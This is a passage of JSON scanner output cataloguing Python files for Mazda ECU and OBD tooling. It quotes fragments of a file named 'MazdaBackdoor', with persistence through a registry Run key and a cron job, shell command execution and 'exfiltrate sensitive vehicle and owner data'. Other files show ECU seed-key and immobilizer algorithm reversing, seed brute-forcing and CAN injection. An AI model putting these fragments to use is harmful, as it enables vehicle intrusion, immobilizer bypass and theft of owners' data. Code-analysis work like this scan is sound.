{"type": "security_pattern", "line": 148, "pattern": "key", "content": "def test_security_key(self, seed: str, key: str) -> bool:"}, {"type": "security_pattern", "line": 148, "pattern": "seed", "content": "def test_security_key(self, seed: str, key: str) -> bool:"}, {"type": "security_pattern", "line": 150, "pattern": "key", "content": "TEST IF SECURITY KEY IS VALID"}, {"type": "security_pattern", "line": 151, "pattern": "key", "content": "Sends key to ECU and checks response"}, {"type": "security_pattern", "line": 160, "pattern": "key", "content": "payload.append(0x02)  # Send key"}, {"type": "security_pattern", "line": 161, "pattern": "key", "content": "payload.extend(bytes.fromhex(key))"}, {"type": "security_pattern", "line": 184, "pattern": "key", "content": "print(f\"Security key test failed: {e}\")"}, {"type": "security_pattern", "line": 191, "pattern": "seed", "content": "Predict seeds based on timing analysis"}, {"type": "security_pattern", "line": 194, "pattern": "seed", "content": "seed_samples = []"}, {"type": "security_pattern", "line": 197, "pattern": "seed", "content": "seed = self.request_seed()"}, {"type": "security_pattern", "line": 198, "pattern": "seed", "content": "if seed:"}, {"type": "security_pattern", "line": 199, "pattern": "seed", "content": "seed_samples.append(seed)"}, {"type": "security_pattern", "line": 203, "pattern": "seed", "content": "predicted_seed = self._predict_next_seed(seed_samples)"}, {"type": "security_pattern", "line": 204, "pattern": "seed", "content": "return predicted_seed"}, {"type": "security_pattern", "line": 206, "pattern": "seed", "content": "def request_seed(self) -> Optional[str]:"}, {"type": "security_pattern", "line": 207, "pattern": "seed", "content": "\"\"\"REQUEST SEED FROM ECU\"\"\""}, {"type": "security_pattern", "line": 226, "pattern": "seed", "content": "seed_bytes = response.data[2:6]"}, {"type": "security_pattern", "line": 227, "pattern": "seed", "content": "return seed_bytes.hex().upper()"}, {"type": "security_pattern", "line": 230, "pattern": "seed", "content": "print(f\"Seed request failed: {e}\")"}, {"type": "security_pattern", "line": 234, "pattern": "seed", "content": "def _predict_next_seed(self, seed_samples: List[str]) -> str:"}, {"type": "security_pattern", "line": 235, "pattern": "seed", "content": "\"\"\"PREDICT NEXT SEED BASED ON PATTERN ANALYSIS\"\"\""}, {"type": "security_pattern", "line": 236, "pattern": "seed", "content": "if len(seed_samples) < 3:"}, {"type": "security_pattern", "line": 237, "pattern": "seed", "content": "return seed_samples[-1] if seed_samples else \"00000000\""}, {"type": "security_pattern", "line": 240, "pattern": "seed", "content": "seed_ints = [int(seed, 16) for seed in seed_samples]"}, {"type": "security_pattern", "line": 243, "pattern": "seed", "content": "last_seed = seed_ints[-1]"}, {"type": "security_pattern", "line": 244, "pattern": "seed", "content": "seed_diff = seed_ints[-1] - seed_ints[-2]"}, {"type": "security_pattern", "line": 246, "pattern": "seed", "content": "predicted_seed = (last_seed + seed_diff) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 247, "pattern": "seed", "content": "return f\"{predicted_seed:08X}\""}, {"type": "security_pattern", "line": 486, "pattern": "seed", "content": "tcm_seed = self.request_seed()  # This would need TCM-specific implementation"}, {"type": "security_pattern", "line": 487, "pattern": "seed", "content": "if tcm_seed:"}, {"type": "security_pattern", "line": 488, "pattern": "key", "content": "tcm_key = selfcalculate_tcm_seed_key(tcm_seed)"}, {"type": "security_pattern", "line": 488, "pattern": "seed", "content": "tcm_key = selfcalculate_tcm_seed_key(tcm_seed)"}, {"type": "security_pattern", "line": 489, "pattern": "key", "content": "if self.test_security_key(tcm_seed, tcm_key):"}, {"type": "security_pattern", "line": 489, "pattern": "seed", "content": "if self.test_security_key(tcm_seed, tcm_key):"}, {"type": "security_pattern", "line": 596, "pattern": "key", "content": "print(\"\\n1. SEED-KEY ALGORITHM \")"}, {"type": "security_pattern", "line": 596, "pattern": "seed", "content": "print(\"\\n1. SEED-KEY ALGORITHM \")"}, {"type": "security_pattern", "line": 596, "pattern": "algorithm", "content": "print(\"\\n1. SEED-KEY ALGORITHM \")"}, {"type": "security_pattern", "line": 599, "pattern": "seed", "content": "test_seed = \"A1B2C3D4\""}, {"type": "security_pattern", "line": 602, "pattern": "key", "content": "ecu_key = .calculate_ecu_seed_key(test_seed)"}, {"type": "security_pattern", "line": 602, "pattern": "seed", "content": "ecu_key = .calculate_ecu_seed_key(test_seed)"}, {"type": "security_pattern", "line": 603, "pattern": "key", "content": "tcm_key = .calculate_tcm_seed_key(\"1A2B\")"}, {"type": "security_pattern", "line": 603, "pattern": "seed", "content": "tcm_key = .calculate_tcm_seed_key(\"1A2B\")"}, {"type": "security_pattern", "line": 605, "pattern": "key", "content": "print(f\"ECU Seed: {test_seed} -> Key: {ecu_key}\")"}, {"type": "security_pattern", "line": 605, "pattern": "seed", "content": "print(f\"ECU Seed: {test_seed} -> Key: {ecu_key}\")"}, {"type": "security_pattern", "line": 606, "pattern": "key", "content": "print(f\"TCM Seed: 1A2B -> Key: {tcm_key}\")"}, {"type": "security_pattern", "line": 606, "pattern": "seed", "content": "print(f\"TCM Seed: 1A2B -> Key: {tcm_key}\")"}, {"type": "security_pattern", "line": 610, "pattern": "key", "content": "brute_force_key =.brute_force_seed_key(test_seed, max_attempts=1000)"}, {"type": "security_pattern", "line": 610, "pattern": "seed", "content": "brute_force_key =.brute_force_seed_key(test_seed, max_attempts=1000)"}, {"type": "security_pattern", "line": 611, "pattern": "key", "content": "if brute_force_key:"}, {"type": "security_pattern", "line": 612, "pattern": "key", "content": "print(f\"Brute force successful: {brute_force_key}\")"}, {"type": "security_pattern", "line": 619, "pattern": "seed", "content": "predicted_seed = _weak_rng()"}, {"type": "security_pattern", "line": 620, "pattern": "seed", "content": "print(f\"Predicted next seed: {predicted_seed}\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts10.py", "lines_read": 184, "features_found": [{"type": "function", "name": "__init__", "line": 25}, {"type": "function", "name": "connect", "line": 32}, {"type": "function", "name": "_send_command", "line": 63}, {"type": "function", "name": "read_ecu_data", "line": 73}, {"type": "function", "name": "_read_boost_pressure", "line": 101}, {"type": "function", "name": "_read_vvt_angle", "line": 108}, {"type": "function", "name": "_read_knock_correction", "line": 114}, {"type": "function", "name": "_read_injector_pulse", "line": 120}, {"type": "function", "name": "_parse_response", "line": 126}, {"type": "function", "name": "_parse_hex_response", "line": 139}, {"type": "function", "name": "_calculate_afr", "line": 151}, {"type": "function", "name": "read_dtcs", "line": 158}, {"type": "function", "name": "clear_dtcs", "line": 170}, {"type": "function", "name": "disconnect", "line": 179}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "serial", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Lock", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "json", "line": null}], "components_found": [{"type": "class", "name": "MazdaOBDService", "line": 10}], "algorithms": [{"type": "algorithm_function", "line": 151, "content": "def _calculate_afr(self, maf_flow: float) -> float:"}], "protocols": [{"type": "protocol", "line": 10, "protocol": "OBD", "content": "class MazdaOBDService:"}, {"type": "protocol", "line": 12, "protocol": "OBD", "content": "OBD-II service specifically tailored for Mazdaspeed 3 2011"}, {"type": "protocol", "line": 17, "protocol": "PID", "content": "MAZDA_SPECIFIC_PIDS = {"}, {"type": "protocol", "line": 103, "protocol": "PID", "content": "response = self._send_command(self.MAZDA_SPECIFIC_PIDS['BOOST_PRESSURE'])"}, {"type": "protocol", "line": 110, "protocol": "PID", "content": "response = self._send_command(self.MAZDA_SPECIFIC_PIDS['VVT_ANGLE'])"}, {"type": "protocol", "line": 116, "protocol": "PID", "content": "response = self._send_command(self.MAZDA_SPECIFIC_PIDS['KNOCK_CORRECTION'])"}, {"type": "protocol", "line": 122, "protocol": "PID", "content": "response = self._send_command(self.MAZDA_SPECIFIC_PIDS['INJECTOR_PULSE'])"}, {"type": "protocol", "line": 127, "protocol": "OBD", "content": "\"\"\"Parse standard OBD-II response\"\"\""}], "hardware_assumptions": [{"type": "hardware", "line": 33, "hardware": "ECU", "content": "\"\"\"Establish connection to vehicle ECU\"\"\""}, {"type": "hardware", "line": 33, "hardware": "vehicle", "content": "\"\"\"Establish connection to vehicle ECU\"\"\""}, {"type": "hardware", "line": 55, "hardware": "ECU", "content": "logger.info(f\"Connected to Mazda ECU on {self.port}\")"}, {"type": "hardware", "line": 59, "hardware": "ECU", "content": "logger.error(f\"Failed to connect to ECU: {e}\")"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "\"\"\"Send command to ECU and return response\"\"\""}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "raise ConnectionError(\"Not connected to ECU\")"}, {"type": "hardware", "line": 73, "hardware": "ECU", "content": "def read_ecu_data(self) -> Dict:"}, {"type": "hardware", "line": 75, "hardware": "ECU", "content": "Read comprehensive ECU data from Mazdaspeed 3"}, {"type": "hardware", "line": 97, "hardware": "ECU", "content": "logger.error(f\"Error reading ECU data: {e}\")"}, {"type": "hardware", "line": 180, "hardware": "ECU", "content": "\"\"\"Close connection to ECU\"\"\""}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts11.py", "lines_read": 195, "features_found": [{"type": "function", "name": "scan_dtcs", "line": 14}, {"type": "function", "name": "clear_dtcs", "line": 59}, {"type": "function", "name": "get_live_data", "line": 93}, {"type": "function", "name": "clear_crash_data", "line": 122}, {"type": "function", "name": "get_health_report", "line": 144}, {"type": "import", "module": "flask", "line": null}, {"type": "import", "module": "flask_jwt_extended", "line": null}, {"type": "import", "module": "app", "line": null}, {"type": "import", "module": "app.models.vehicle", "line": null}, {"type": "import", "module": "app.services.obd_service", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Blueprint,", "line": null}, {"type": "import", "module": "jwt_required,", "line": null}, {"type": "import", "module": "db", "line": null}, {"type": "import", "module": "Vehicle,", "line": null}, {"type": "import", "module": "MazdaOBDService", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "logging", "line": null}], "components_found": [], "algorithms": [], "protocols": [{"type": "protocol", "line": 5, "protocol": "OBD", "content": "from app.services.obd_service import MazdaOBDService"}, {"type": "protocol", "line": 22, "protocol": "OBD", "content": "obd_service = MazdaOBDService()"}, {"type": "protocol", "line": 67, "protocol": "OBD", "content": "obd_service = MazdaOBDService()"}, {"type": "protocol", "line": 100, "protocol": "OBD", "content": "obd_service = MazdaOBDService()"}], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "ECU", "content": "from app.models.vehicle import Vehicle, DiagnosticTroubleCode, ECUData"}, {"type": "hardware", "line": 4, "hardware": "vehicle", "content": "from app.models.vehicle import Vehicle, DiagnosticTroubleCode, ECUData"}, {"type": "hardware", "line": 17, "hardware": "vehicle", "content": "vehicle = Vehicle.query.filter_by(id=vin, user_id=get_jwt_identity()).first()"}, {"type": "hardware", "line": 18, "hardware": "vehicle", "content": "if not vehicle:"}, {"type": "hardware", "line": 19, "hardware": "vehicle", "content": "return jsonify({'error': 'Vehicle not found'}), 404"}, {"type": "hardware", "line": 24, "hardware": "vehicle", "content": "return jsonify({'error': 'Failed to connect to vehicle'}), 500"}, {"type": "hardware", "line": 32, "hardware": "vehicle", "content": "vehicle_id=vin, code=dtc['code'], cleared_at=None"}, {"type": "hardware", "line": 37, "hardware": "vehicle", "content": "vehicle_id=vin,"}, {"type": "hardware", "line": 48, "hardware": "vehicle", "content": "vehicle_id=vin, cleared_at=None"}, {"type": "hardware", "line": 62, "hardware": "vehicle", "content": "vehicle = Vehicle.query.filter_by(id=vin, user_id=get_jwt_identity()).first()"}, {"type": "hardware", "line": 63, "hardware": "vehicle", "content": "if not vehicle:"}, {"type": "hardware", "line": 64, "hardware": "vehicle", "content": "return jsonify({'error': 'Vehicle not found'}), 404"}, {"type": "hardware", "line": 75, "hardware": "vehicle", "content": "vehicle_id=vin, cleared_at=None"}, {"type": "hardware", "line": 94, "hardware": "ECU", "content": "\"\"\"Get real-time ECU data\"\"\""}, {"type": "hardware", "line": 96, "hardware": "vehicle", "content": "vehicle = Vehicle.query.filter_by(id=vin, user_id=get_jwt_identity()).first()"}, {"type": "hardware", "line": 97, "hardware": "vehicle", "content": "if not vehicle:"}, {"type": "hardware", "line": 98, "hardware": "vehicle", "content": "return jsonify({'error': 'Vehicle not found'}), 404"}, {"type": "hardware", "line": 102, "hardware": "vehicle", "content": "return jsonify({'error': 'Failed to connect to vehicle'}), 500"}, {"type": "hardware", "line": 105, "hardware": "ECU", "content": "live_data = obd_service.read_ecu_data()"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "ecu_data = ECUData(vehicle_id=vin, **live_data)"}, {"type": "hardware", "line": 108, "hardware": "vehicle", "content": "ecu_data = ECUData(vehicle_id=vin, **live_data)"}, {"type": "hardware", "line": 109, "hardware": "ECU", "content": "db.session.add(ecu_data)"}, {"type": "hardware", "line": 125, "hardware": "vehicle", "content": "vehicle = Vehicle.query.filter_by(id=vin, user_id=get_jwt_identity()).first()"}, {"type": "hardware", "line": 126, "hardware": "vehicle", "content": "if not vehicle:"}, {"type": "hardware", "line": 127, "hardware": "vehicle", "content": "return jsonify({'error': 'Vehicle not found'}), 404"}, {"type": "hardware", "line": 145, "hardware": "vehicle", "content": "\"\"\"Generate comprehensive vehicle health report\"\"\""}, {"type": "hardware", "line": 147, "hardware": "vehicle", "content": "vehicle = Vehicle.query.filter_by(id=vin, user_id=get_jwt_identity()).first()"}, {"type": "hardware", "line": 148, "hardware": "vehicle", "content": "if not vehicle:"}, {"type": "hardware", "line": 149, "hardware": "vehicle", "content": "return jsonify({'error': 'Vehicle not found'}), 404"}, {"type": "hardware", "line": 153, "hardware": "vehicle", "content": "vehicle_id=vin, cleared_at=None"}, {"type": "hardware", "line": 157, "hardware": "ECU", "content": "recent_data = ECUData.query.filter_by(vehicle_id=vin)\\"}, {"type": "hardware", "line": 157, "hardware": "vehicle", "content": "recent_data = ECUData.query.filter_by(vehicle_id=vin)\\"}, {"type": "hardware", "line": 158, "hardware": "ECU", "content": ".order_by(ECUData.timestamp.desc())\\"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts12.py", "lines_read": 323, "features_found": [{"type": "function", "name": "main", "line": 306}, {"type": "function", "name": "__init__", "line": 23}, {"type": "function", "name": "generate_key", "line": 30}, {"type": "function", "name": "encrypt_data", "line": 42}, {"type": "function", "name": "decrypt_data", "line": 48}, {"type": "function", "name": "establish_backdoor", "line": 54}, {"type": "function", "name": "execute_command", "line": 85}, {"type": "function", "name": "dump_ecu_maps", "line": 116}, {"type": "function", "name": "read_diagnostic_codes", "line": 146}, {"type": "function", "name": "flash_ecu", "line": 159}, {"type": "function", "name": "unlock_performance_maps", "line": 177}, {"type": "function", "name": "get_system_info", "line": 188}, {"type": "function", "name": "extract_vin", "line": 211}, {"type": "function", "name": "clear_diagnostic_codes", "line": 216}, {"type": "function", "name": "enable_persistence", "line": 220}, {"type": "function", "name": "exfiltrate_sensitive_data", "line": 243}, {"type": "function", "name": "start_monitoring", "line": 267}, {"type": "function", "name": "data_collection_loop", "line": 279}, {"type": "import", "module": "cryptography.fernet", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.kdf.pbkdf2", "line": null}, {"type": "import", "module": "socket", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "subprocess", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "base64", "line": null}, {"type": "import", "module": "Fernet", "line": null}, {"type": "import", "module": "hashes", "line": null}, {"type": "import", "module": "PBKDF2HMAC", "line": null}, {"type": "import", "module": "winreg", "line": null}], "components_found": [{"type": "class", "name": "MazdaBackdoor", "line": 22}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 25, "hardware": "ECU", "content": "self.ecu_key = b'mazda_gov_backdoor_2024_secure_key_override_'"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "f = Fernet(self.ecu_key)"}, {"type": "hardware", "line": 50, "hardware": "ECU", "content": "f = Fernet(self.ecu_key)"}, {"type": "hardware", "line": 78, "hardware": "ECU", "content": "response = self.execute_command(command)"}, {"type": "hardware", "line": 85, "hardware": "ECU", "content": "def execute_command(self, command: str) -> str:"}, {"type": "hardware", "line": 86, "hardware": "ECU", "content": "\"\"\"Execute received commands with system-level access\"\"\""}, {"type": "hardware", "line": 89, "hardware": "ECU", "content": "if command.startswith(\"ECU_\"):"}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "if command == \"ECU_DUMP_MAPS\":"}, {"type": "hardware", "line": 91, "hardware": "ECU", "content": "return self.dump_ecu_maps()"}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "elif command == \"ECU_READ_DTC\":"}, {"type": "hardware", "line": 94, "hardware": "ECU", "content": "elif command.startswith(\"ECU_FLASH\"):"}, {"type": "hardware", "line": 95, "hardware": "ECU", "content": "return self.flash_ecu(command.split(\":\")[1])"}, {"type": "hardware", "line": 96, "hardware": "ECU", "content": "elif command == \"ECU_UNLOCK_PERFORMANCE\":"}, {"type": "hardware", "line": 111, "hardware": "ECU", "content": "return f\"Command executed: {command}\""}, {"type": "hardware", "line": 116, "hardware": "ECU", "content": "def dump_ecu_maps(self) -> str:"}, {"type": "hardware", "line": 117, "hardware": "ECU", "content": "\"\"\"Dump all ECU tuning maps and calibration data\"\"\""}, {"type": "hardware", "line": 150, "hardware": "ECU", "content": "\"P0611\": \"ECU Internal Memory Error - CUSTOM MAPS LOADED\","}, {"type": "hardware", "line": 159, "hardware": "ECU", "content": "def flash_ecu(self, map_data: str) -> str:"}, {"type": "hardware", "line": 160, "hardware": "ECU", "content": "\"\"\"Flash custom maps to ECU - government override\"\"\""}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "return f\"ECU flashed with government overrides: {json.dumps(safety_overrides)}\""}, {"type": "hardware", "line": 175, "hardware": "ECU", "content": "return \"ECU flash failed\""}, {"type": "hardware", "line": 191, "hardware": "vehicle", "content": "\"vehicle\": {"}, {"type": "hardware", "line": 194, "hardware": "ECU", "content": "\"ecu\": \"MZR 2.3L DISI TURBO - GOVERNMENT ACCESS\","}, {"type": "hardware", "line": 195, "hardware": "ECU", "content": "\"mileage\": \"extracted_from_ecu\""}, {"type": "hardware", "line": 204, "hardware": "ECU", "content": "\"security_level\": \"ROOT\","}, {"type": "hardware", "line": 212, "hardware": "ECU", "content": "\"\"\"Extract VIN from ECU memory\"\"\""}, {"type": "hardware", "line": 229, "hardware": "ECU", "content": "winreg.SetValueEx(reg_key, \"MazdaECU_Service\", 0, winreg.REG_SZ, sys.argv[0])"}, {"type": "hardware", "line": 233, "hardware": "ABS", "content": "cron_cmd = f\"@reboot sleep 60 && python3 {os.path.abspath(__file__)} >/dev/null 2>&1\\n\""}, {"type": "hardware", "line": 244, "hardware": "vehicle", "content": "\"\"\"Exfiltrate sensitive vehicle and owner data\"\"\""}, {"type": "hardware", "line": 246, "hardware": "vehicle", "content": "\"vehicle_data\": {"}, {"type": "hardware", "line": 259, "hardware": "ECU", "content": "\"max_speed_achieved\": \"extracted_from_ecu\","}, {"type": "hardware", "line": 284, "hardware": "ECU", "content": "ecu_data = {"}, {"type": "hardware", "line": 295, "hardware": "ECU", "content": "encrypted_data = self.encrypt_data(json.dumps(ecu_data))"}, {"type": "hardware", "line": 307, "hardware": "ECU", "content": "\"\"\"Main execution - disguised as legitimate Mazda software\"\"\""}, {"type": "hardware", "line": 309, "hardware": "ECU", "content": "print(\"Initializing ECU communication...\")"}], "security_logic": [{"type": "security_pattern", "line": 16, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 19, "pattern": "hash", "content": "from cryptography.hazmat.primitives import hashes"}, {"type": "security_pattern", "line": 25, "pattern": "key", "content": "self.ecu_key = b'mazda_gov_backdoor_2024_secure_key_override_'"}, {"type": "security_pattern", "line": 30, "pattern": "password", "content": "def generate_key(self, password: str) -> bytes:"}, {"type": "security_pattern", "line": 30, "pattern": "key", "content": "def generate_key(self, password: str) -> bytes:"}, {"type": "security_pattern", "line": 31, "pattern": "password", "content": "\"\"\"Generate encryption key from password\"\"\""}, {"type": "security_pattern", "line": 31, "pattern": "key", "content": "\"\"\"Generate encryption key from password\"\"\""}, {"type": "security_pattern", "line": 31, "pattern": "encrypt", "content": "\"\"\"Generate encryption key from password\"\"\""}, {"type": "security_pattern", "line": 32, "pattern": "password", "content": "password = password.encode()"}, {"type": "security_pattern", "line": 34, "pattern": "algorithm", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 34, "pattern": "hash", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 39, "pattern": "password", "content": "key = base64.urlsafe_b64encode(kdf.derive(password))"}, {"type": "security_pattern", "line": 39, "pattern": "key", "content": "key = base64.urlsafe_b64encode(kdf.derive(password))"}, {"type": "security_pattern", "line": 40, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 42, "pattern": "encrypt", "content": "def encrypt_data(self, data: str) -> str:"}, {"type": "security_pattern", "line": 43, "pattern": "encrypt", "content": "\"\"\"Encrypt exfiltrated data\"\"\""}, {"type": "security_pattern", "line": 44, "pattern": "key", "content": "f = Fernet(self.ecu_key)"}, {"type": "security_pattern", "line": 45, "pattern": "encrypt", "content": "encrypted = f.encrypt(data.encode())"}, {"type": "security_pattern", "line": 46, "pattern": "encrypt", "content": "return base64.urlsafe_b64encode(encrypted).decode()"}, {"type": "security_pattern", "line": 48, "pattern": "encrypt", "content": "def decrypt_data(self, encrypted_data: str) -> str:"}, {"type": "security_pattern", "line": 48, "pattern": "decrypt", "content": "def decrypt_data(self, encrypted_data: str) -> str:"}, {"type": "security_pattern", "line": 49, "pattern": "decrypt", "content": "\"\"\"Decrypt received commands\"\"\""}, {"type": "security_pattern", "line": 50, "pattern": "key", "content": "f = Fernet(self.ecu_key)"}, {"type": "security_pattern", "line": 51, "pattern": "encrypt", "content": "decrypted = f.decrypt(base64.urlsafe_b64decode(encrypted_data))"}, {"type": "security_pattern", "line": 51, "pattern": "decrypt", "content": "decrypted = f.decrypt(base64.urlsafe_b64decode(encrypted_data))"}, {"type": "security_pattern", "line": 52, "pattern": "decrypt", "content": "return decrypted.decode()"}, {"type": "security_pattern", "line": 69, "pattern": "encrypt", "content": "sock.send(self.encrypt_data(json.dumps(handshake)).encode())"}, {"type": "security_pattern", "line": 73, "pattern": "encrypt", "content": "command_encrypted = sock.recv(1024).decode()"}, {"type": "security_pattern", "line": 74, "pattern": "encrypt", "content": "if not command_encrypted:"}, {"type": "security_pattern", "line": 77, "pattern": "encrypt", "content": "command = self.decrypt_data(command_encrypted)"}, {"type": "security_pattern", "line": 77, "pattern": "decrypt", "content": "command = self.decrypt_data(command_encrypted)"}, {"type": "security_pattern", "line": 79, "pattern": "encrypt", "content": "sock.send(self.encrypt_data(response).encode())"}, {"type": "security_pattern", "line": 226, "pattern": "key", "content": "key = winreg.HKEY_CURRENT_USER"}, {"type": "security_pattern", "line": 227, "pattern": "key", "content": "subkey = r\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\""}, {"type": "security_pattern", "line": 228, "pattern": "key", "content": "with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:"}, {"type": "security_pattern", "line": 229, "pattern": "key", "content": "winreg.SetValueEx(reg_key, \"MazdaECU_Service\", 0, winreg.REG_SZ, sys.argv[0])"}, {"type": "security_pattern", "line": 265, "pattern": "encrypt", "content": "return self.encrypt_data(json.dumps(sensitive_data))"}, {"type": "security_pattern", "line": 295, "pattern": "encrypt", "content": "encrypted_data = self.encrypt_data(json.dumps(ecu_data))"}, {"type": "security_pattern", "line": 319, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [{"type": "security_risk", "line": 11, "risk": "subprocess", "content": "import subprocess"}, {"type": "security_risk", "line": 104, "risk": "subprocess", "content": "result = subprocess.run(cmd, shell=True, capture_output=True, text=True)"}, {"type": "security_risk", "line": 104, "risk": "shell=True", "content": "result = subprocess.run(cmd, shell=True, capture_output=True, text=True)"}, {"type": "security_risk", "line": 236, "risk": "subprocess", "content": "subprocess.run(\"crontab /tmp/cron_job\", shell=True)"}, {"type": "security_risk", "line": 236, "risk": "shell=True", "content": "subprocess.run(\"crontab /tmp/cron_job\", shell=True)"}], "group_tags": ["muts"]}
{"file_path": "muts13.py", "lines_read": 456, "features_found": [{"type": "function", "name": "main", "line": 389}, {"type": "function", "name": "__init__", "line": 18}, {"type": "function", "name": "reverse_engineer_seed_key", "line": 23}, {"type": "function", "name": "_mazda_27_algorithm", "line": 50}, {"type": "function", "name": "_mazda_tcm_algorithm", "line": 64}, {"type": "function", "name": "_mazda_immobilizer_algorithm", "line": 77}, {"type": "function", "name": "_derive_vin_key", "line": 91}, {"type": "function", "name": "map_ecu_memory", "line": 102}, {"type": "function", "name": "__init__", "line": 130}, {"type": "function", "name": "define_safety_limits", "line": 135}, {"type": "function", "name": "real_time_optimization", "line": 147}, {"type": "function", "name": "_optimize_timing", "line": 164}, {"type": "function", "name": "_optimize_boost", "line": 182}, {"type": "function", "name": "_optimize_fuel", "line": 198}, {"type": "function", "name": "_optimize_vvt", "line": 213}, {"type": "function", "name": "_apply_safety_limits", "line": 225}, {"type": "function", "name": "_learn_from_optimization", "line": 242}, {"type": "function", "name": "__init__", "line": 260}, {"type": "function", "name": "enumerate_j2534_exploits", "line": 264}, {"type": "function", "name": "execute_memory_dump", "line": 290}, {"type": "function", "name": "_build_read_memory_payload", "line": 311}, {"type": "function", "name": "__init__", "line": 326}, {"type": "function", "name": "enumerate_ecu_ids", "line": 330}, {"type": "function", "name": "inject_diagnostic_session", "line": 341}, {"type": "function", "name": "security_access_attack", "line": 357}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}], "components_found": [{"type": "class", "name": "MazdaECUExploit", "line": 15}, {"type": "class", "name": "AutonomousTuner", "line": 127}, {"type": "class", "name": "DiagnosticExploits", "line": 257}, {"type": "class", "name": "CANInjection", "line": 323}], "algorithms": [{"type": "algorithm_function", "line": 50, "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 64, "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 77, "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 91, "content": "def _derive_vin_key(self):"}], "protocols": [{"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "'description': 'Main ECU security access (0x27)',"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (key[i] & 0xFF) ^ 0xA9"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (key[i] + 0x1F) & 0xFF"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 106, "protocol": "0x[0-9A-Fa-f]+", "content": "'ignition_timing': {'address': 0xFFA000, 'size': 0x800, 'description': '16x16 ignition map'},"}, {"type": "protocol", "line": 107, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_maps': {'address': 0xFFA800, 'size': 0x800, 'description': '16x16 fuel map'},"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_control': {'address': 0xFFB000, 'size': 0x400, 'description': 'Boost target maps'},"}, {"type": "protocol", "line": 109, "protocol": "0x[0-9A-Fa-f]+", "content": "'vvt_maps': {'address': 0xFFB400, 'size': 0x400, 'description': 'Variable valve timing'},"}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limit': {'address': 0xFFB800, 'size': 0x100, 'description': 'RPM limiters'},"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "'speed_limit': {'address': 0xFFB900, 'size': 0x100, 'description': 'Speed governor'}"}, {"type": "protocol", "line": 114, "protocol": "0x[0-9A-Fa-f]+", "content": "'knock_learn': {'address': 0xFFC000, 'size': 0x200, 'description': 'Knock adaptation'},"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_trim': {'address': 0xFFC200, 'size': 0x200, 'description': 'Long/short term fuel trims'},"}, {"type": "protocol", "line": 116, "protocol": "0x[0-9A-Fa-f]+", "content": "'throttle_adapt': {'address': 0xFFC400, 'size': 0x100, 'description': 'Throttle body 